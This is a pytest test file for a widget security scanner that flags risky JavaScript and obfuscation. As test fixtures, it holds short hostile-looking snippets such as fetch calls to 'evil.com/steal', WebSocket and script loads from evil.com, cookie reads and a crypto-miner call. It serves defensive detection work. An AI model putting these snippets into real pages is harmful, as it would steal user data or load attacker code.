"""Security scanner tests for the widget system."""

import pytest

from app.widgets.security import (
    PASS_THRESHOLD,
    check_code_size,
    check_obfuscation,
    scan_widget_code,
)


class TestSecurityScanner:
    def test_clean_code_passes(self):
        result = scan_widget_code("<div>Hello World</div>")
        assert result["passed"] is True
        assert result["score"] == 100
        assert result["issues"] == []

    def test_clean_code_with_css(self):
        result = scan_widget_code("<div>Hi</div>", css="body { color: red; }")
        assert result["passed"] is True
        assert result["score"] == 100

    @pytest.mark.parametrize(
        "code,expected_rule",
        [
            ("eval('alert(1)')", "eval_usage"),
            ("document.cookie", "document_cookie"),
            ("<script src='https://evil.com/mine.js'>", "external_script"),
            ("coinimp.start()", "crypto_miner"),
            ("var x = atob('abc'))", "base64_exec"),
            ("fetch('https://evil.com/steal')", "fetch_external"),
            ("new WebSocket('ws://evil.com')", "websocket_external"),
            ("createElement('iframe')", "iframe_injection"),
            ("localStorage.getItem('key')", "localstorage_read"),
            ("parent.postMessage('data', '*')", "postmessage_parent"),
        ],
        ids=[
            "eval",
            "cookie-theft",
            "external-script",
            "crypto-miner",
            "base64-exec",
            "fetch-external",
            "websocket-external",
            "iframe-injection",
            "localstorage-read",
            "postmessage-parent",
        ],
    )
    def test_detects_malicious_patterns(self, code, expected_rule):
        result = scan_widget_code(code)
        rules = [i["rule"] for i in result["issues"]]
        assert expected_rule in rules

    def test_critical_issue_fails_scan(self):
        result = scan_widget_code("eval('malicious')")
        assert result["passed"] is False
        assert result["score"] == 0

    def test_critical_issue_score_is_zero(self):
        """Any single critical issue drops the score to 0."""
        result = scan_widget_code("document.cookie")
        assert result["score"] == 0

    def test_high_issue_deducts_25(self):
        """A single high-severity issue deducts 25 points."""
        result = scan_widget_code("<script src='http://cdn.example.com/lib.js'></script>")
        # Should have external_script (high) + possibly others
        high_issues = [i for i in result["issues"] if i["severity"] == "high"]
        assert len(high_issues) >= 1
        # Score depends on total issues, but with just one high it should be 75
        # (may vary if other rules also match)

    def test_score_calculation_multiple_issues(self):
        """Multiple medium issues reduce score gradually."""
        # XMLHttpRequest (medium) + form submit (medium) + redirect (medium)
        code = """
new XMLHttpRequest();
<form action="/steal">;
window.location = "http://evil.com";
"""
        result = scan_widget_code(code)
        # 3 medium issues = -30 points = 70
        medium_count = sum(1 for i in result["issues"] if i["severity"] == "medium")
        assert medium_count >= 3
        # With 3 medium = 70, which is above threshold of 60
        assert result["score"] <= 100

    def test_score_never_below_zero(self):
        """Score is clamped to 0 minimum."""
        # Many high-severity issues
        code = "\n".join(
            [
                "<script src='http://evil.com/a.js'>",
                "<script src='http://evil.com/b.js'>",
                "<script src='http://evil.com/c.js'>",
                "<script src='http://evil.com/d.js'>",
                "<script src='http://evil.com/e.js'>",
            ]
        )
        result = scan_widget_code(code)
        assert result["score"] >= 0

    def test_issues_sorted_by_severity(self):
        """Issues should be sorted: critical first, then high, medium, low."""
        code = "console.log('debug'); eval('bad'); new XMLHttpRequest();"
        result = scan_widget_code(code)
        severities = [i["severity"] for i in result["issues"]]
        order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        ordered = sorted(severities, key=lambda s: order[s])
        assert severities == ordered

    def test_issue_structure(self):
        """Each issue should have rule, description, severity, line."""
        result = scan_widget_code("eval('test')")
        assert len(result["issues"]) > 0
        issue = result["issues"][0]
        assert "rule" in issue
        assert "description" in issue
        assert "severity" in issue
        assert "line" in issue

    def test_line_number_tracking(self):
        """Issue line numbers correspond to where the pattern was found."""
        code = "var x = 1;\nvar y = 2;\neval('bad');"
        result = scan_widget_code(code)
        eval_issues = [i for i in result["issues"] if i["rule"] == "eval_usage"]
        assert len(eval_issues) == 1
        assert eval_issues[0]["line"] == 3

    def test_css_is_also_scanned(self):
        """Malicious patterns in CSS are also detected."""
        result = scan_widget_code("<div>safe</div>", css="body { } eval('bad')")
        rules = [i["rule"] for i in result["issues"]]
        assert "eval_usage" in rules

    def test_pass_threshold(self):
        """Scores at or above PASS_THRESHOLD pass, below fail."""
        assert PASS_THRESHOLD == 60
        # Low-severity issues: console.log deducts 3 each
        # 14 console.log calls = -42 points = 58 (below threshold)
        code = "\n".join([f"console.log('debug{i}');" for i in range(14)])
        result = scan_widget_code(code)
        assert result["score"] < PASS_THRESHOLD
        assert result["passed"] is False


class TestCodeSizeCheck:
    def test_small_code_passes(self):
        issues = check_code_size("short code")
        assert issues == []

    def test_code_exceeds_limit(self):
        big = "x" * 500001
        issues = check_code_size(big)
        assert len(issues) == 1
        assert issues[0]["rule"] == "code_too_large"
        assert issues[0]["severity"] == "high"

    def test_code_near_limit_warns(self):
        # 80% of 500000 = 400000
        near = "x" * 400001
        issues = check_code_size(near)
        assert len(issues) == 1
        assert issues[0]["rule"] == "code_near_limit"
        assert issues[0]["severity"] == "low"

    def test_custom_max_bytes(self):
        issues = check_code_size("x" * 101, max_bytes=100)
        assert len(issues) == 1
        assert issues[0]["rule"] == "code_too_large"

    def test_exactly_at_limit(self):
        issues = check_code_size("x" * 500000)
        # Exactly at limit should not trigger "too_large" but may trigger "near_limit"
        rules = [i["rule"] for i in issues]
        assert "code_too_large" not in rules

    def test_under_80_percent_clean(self):
        # Under 80% threshold should produce no issues
        issues = check_code_size("x" * 399999)
        assert issues == []


class TestObfuscationDetection:
    def test_clean_code_no_issues(self):
        issues = check_obfuscation("function hello() { return 'world'; }")
        assert issues == []

    def test_long_line_detected(self):
        code = "x" * 1001
        issues = check_obfuscation(code)
        rules = [i["rule"] for i in issues]
        assert "obfuscated_long_line" in rules

    def test_multiple_long_lines(self):
        code = "\n".join(["x" * 1001 for _ in range(5)])
        issues = check_obfuscation(code)
        rules = [i["rule"] for i in issues]
        assert "obfuscated_many_long_lines" in rules

    def test_excessive_hex_escapes(self):
        code = "var s = " + "".join([f"\\x{i:02x}" for i in range(51)]) + ";"
        issues = check_obfuscation(code)
        rules = [i["rule"] for i in issues]
        assert "obfuscated_escape_sequences" in rules

    def test_moderate_hex_escapes(self):
        code = "var s = " + "".join([f"\\x{i:02x}" for i in range(25)]) + ";"
        issues = check_obfuscation(code)
        escape_issues = [i for i in issues if i["rule"] == "obfuscated_escape_sequences"]
        assert len(escape_issues) >= 1
        assert escape_issues[0]["severity"] == "medium"

    def test_unicode_escapes_counted(self):
        code = "var s = " + "".join([f"\\u{i:04x}" for i in range(51)]) + ";"
        issues = check_obfuscation(code)
        rules = [i["rule"] for i in issues]
        assert "obfuscated_escape_sequences" in rules

    def test_low_alphanumeric_ratio(self):
        # Build a string >200 chars with very low alphanumeric ratio
        code = "({[!@#$%^&*()]})" * 20  # mostly non-alphanumeric
        issues = check_obfuscation(code)
        rules = [i["rule"] for i in issues]
        assert "obfuscated_char_density" in rules

    def test_normal_alphanumeric_ratio(self):
        code = "function hello() { var x = 1; return x + 2; } " * 10
        issues = check_obfuscation(code)
        rules = [i["rule"] for i in issues]
        assert "obfuscated_char_density" not in rules

    def test_packed_pattern_string_fromcharcode(self):
        code = "\n".join([f"String.fromCharCode({i})" for i in range(5)])
        issues = check_obfuscation(code)
        encoding_issues = [i for i in issues if i["rule"] == "obfuscated_encoding"]
        assert len(encoding_issues) >= 1
        assert encoding_issues[0]["severity"] == "high"

    def test_single_packed_pattern_medium_severity(self):
        code = "var x = String.fromCharCode(65);"
        issues = check_obfuscation(code)
        encoding_issues = [i for i in issues if i["rule"] == "obfuscated_encoding"]
        assert len(encoding_issues) >= 1
        assert encoding_issues[0]["severity"] == "medium"

    def test_function_constructor_detected(self):
        code = "var f = Function('return 1');"
        issues = check_obfuscation(code)
        encoding_issues = [i for i in issues if i["rule"] == "obfuscated_encoding"]
        assert len(encoding_issues) >= 1

    def test_short_code_skips_density_check(self):
        # Code <= 200 chars should not trigger density check
        code = "({[!@#$%]})" * 5  # 55 chars, low alpha ratio
        assert len(code) <= 200
        issues = check_obfuscation(code)
        rules = [i["rule"] for i in issues]
        assert "obfuscated_char_density" not in rules
